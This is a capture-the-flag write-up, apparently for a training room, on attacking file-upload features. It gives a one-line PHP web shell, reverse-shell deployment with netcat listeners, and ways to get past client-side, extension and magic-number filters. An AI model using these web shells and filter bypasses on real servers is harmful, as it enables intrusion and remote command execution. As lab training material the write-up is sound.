> First task is to configure `/etc/hosts` file of device by adding this line :
> `10.10.2.79    overwrite.uploadvulns.thm shell.uploadvulns.thm java.uploadvulns.thm annex.uploadvulns.thm magic.uploadvulns.thm jewel.uploadvulns.thm demo.uploadvulns.thm`
> it will be different for every instance, change the IP & also make sure there are no duplicate entries for different IPs and make sure to remove that line after terminating instance.

1. **Overwriting Existing Files**
	when in website we can upload files, this vuln comes into picture.
	First we analyze source code by inspecting and see what image is already there on website for example the image on website may be sourced from `/assets/mountains.jpg` and this will be shown in source code, so we want to overwrite this `mountains.jpg` by uploading a new file with same name `mountains.jpg` and now contents will be overwritten.
---
2. **Remote Code Execution (RCE)**

- First run a `gobuster` scan to see valid endpoints :
	`gobuster dir -u http://shell.uploadvulns.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`
	
- now we see that `/resources` and `/assets` gives us a hit and resources contains all the uploaded files and since we know that the backend uses `php`, we can make use of a `php script` to get a reverse shell and perform `RCE`.
- first we will upload simple webshell with a script called `webshell.php` :
```
<?php  
    echo system($_GET["cmd"]);  
?>
```
>This code takes a GET parameter and executes it as a system command. It then echoes the output out to the screen.

- now we navigate to `URL/resources/webshell.php?cmd=id;whoami;ls` and run commands like this and the contents are echoed on the screen
- Now coming to reverse shells, we first download the `php-reverse-shell.php` from [pentestmonkey](https://pentestmonkey.net/tools/web-shells/php-reverse-shell)  and do `sudo nano php-reverse-shell.php` and change the IP on line `49` to the attackbox IP which over here is my local kali machine IP using `openvpn`
	`$ip = '127.0.0.1';  // CHANGE THIS`
  but keep the port number unchanged which is `1234`
- now on another terminal tab run `nc -lvnp 1234` and deploy a netcat listener and now navigate to `URL/resources/php-reverse-shell.php` and now the website kinda hangs but when we do go to our netcat listener, we now have attained `RCE` so now do `cd /var/www` and `cat flag.txt` 
---
3. **Bypassing Client Side Filtering**

- such filters are put in place using javascript code, so we can just disable javascript in `mozilla` by searching `about:config` and `accept risk` and `javascript enabled:false` .
- one more way is to upload the file directly using `curl` 
> `curl -X POST -F "submit:<value>" -F "<file-parameter>:@<path-to-file>" <site>`
> To use this method you would first aim to intercept a successful upload (using Burpsuite or the browser console) to see the parameters being used in the upload, which can then be slotted into the above command.

- on encountering the website, we do `inspect` and view `source code` and stumble upon `filter.js` where we see the following code 
```
if (file.type != "image/png")
		{
			upload.value = "";
			uploadMsg.style = "display:none;";
			error();
		} 
```
- so we will use the same `reverse shell script` from [pentestmonkey](https://pentestmonkey.net/tools/web-shells/php-reverse-shell) but to bypass the filter we will rename it as `reverse.png` according to the filter script and then we capture the `POST` request after clicking `upload` and change the `file name` to `reverse.php`.
- now new terminal open netcat listener on port `1234` as `nc -lvnp 1234` with the IP set to our kali machine in the `reverse.php` script and go to `URL/images/reverse.php` , the site will hang but we get a reverse shell on our terminal and do `cat /var/www/flag.txt` 
---
4. **Bypassing Server Side Filtering**
	Here we cant see the source code so we need to keep poking the backend and see what is restricted by filter and finally craft a payload that escapes all the filters. It does it using the file extensions.

- let's say there's a script that blacklists `.php` & `.phtml` files by checking the last `.` (period) and splitting, from wikipedia there's actually a variety of other php extensions that may bypass the filter, they are :
	`.php3`, `.php4`,`.php5`,`.php7`,`.phps`,`.php-s`,`.pht` and `.phar`  
	here `/privacy` is the endpoint after doing `gobuster` where files are stored and it wont accept `.php` so we try all the above ones and none of them really work except `.phar` (but this is knowing that .html and .php is blacklisted assuming we do have source code).

- now coming to actual part when we dont have source code, we play around and try uploading different files and it accepts `.jpg` and image like extensions but will filter out `.php` so what we do is rename it to `reverse.jpg.php` cuz it filters based on the first `period (.)` that it encounters and it thinks its a jpg cuz `.jpg is present in the name`
- so mixing both the above points we upload file named `reverse.jpg.php5` and it will accept the file type and now open netcat listener and get reverse shell and `cat /var/www/flag.txt`
---
5. **Bypassing Server Side Filtering : Magic Numbers**
	magic number is a string of hex digits of a file, always usually the first few bytes of the file 
	this bypass is usually very effective for `php` based web servers and not usually for other kind of servers.
	insert bytes `FF D8 FF D8` in the beginning of the `reverse.php` script and it gets spoofed as `jpg` and the website will allow it to be uploaded.
	>`/graphics` contains the uploaded files (after doing gobuster)
	>access by doing `URL/graphics/reverse.php`

	magic number can be of any type need not necessarily be `jpg` so look up `Gary Kessler tables` for magic numbers.
---
### Final Challenge

- `gobuster dir -u http://jewel.uploadvulns.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`
	this gives endpoints like `/admin`,`/modules`,`/content`,`/assets`
- by seeing `Wappalyser` we come to know that admin page is using `Node.js` and `express` so here `php reverse shell script` will not work and we need a `Node.js reverse shell script`.
- view source code and we get `upload.js` : (major part of code that is critical for us)
```
//Check File Size
			if (event.target.result.length > 50 * 8 * 1024){
				setResponseMsg("File too big", "red");			
				return;
			}
			//Check Magic Number
			if (atob(event.target.result.split(",")[1]).slice(0,3) != "ÿØÿ"){
				setResponseMsg("Invalid file format", "red");
				return;	
			}
			//Check File Extension
			const extension = fileBox.name.split(".")[1].toLowerCase();
			if (extension != "jpg" && extension != "jpeg"){
				setResponseMsg("Invalid file format", "red");
				return;
			}
```
- now run another gobuster on `/content` for jpg files using wordlist given in task files
`gobuster dir -u http://jewel.uploadvulns.thm/content/ -w wordlist.txt -t 250 -x jpg`
we get `/ABH.jpg`,`/LKQ.jpg`,`/SAD.jpg`,`/AHN.jpg`,`UAD.jpg` , any new 3 letter image not matching the previous gobuster scan that will be the name of file we uploaded.
- do `ctrl+F5` to clear cache and then intercept the `upload.js` and `do intercept` -> `edit response` and `comment` ou the magic number filter and then forward and turn off intercept.
- rename the `node.js reverse shell script` to `.jpg` and upload it, it will say successful, then again run gobuster scan and see which 3 letter jpg is different and go to `/admin` and activate that module by doing `../content/XYZ.jpg` where `XYZ` is the name of the shell and then on our netcat listener we do `cat /var/www/flag.txt` and we get the flag.
---

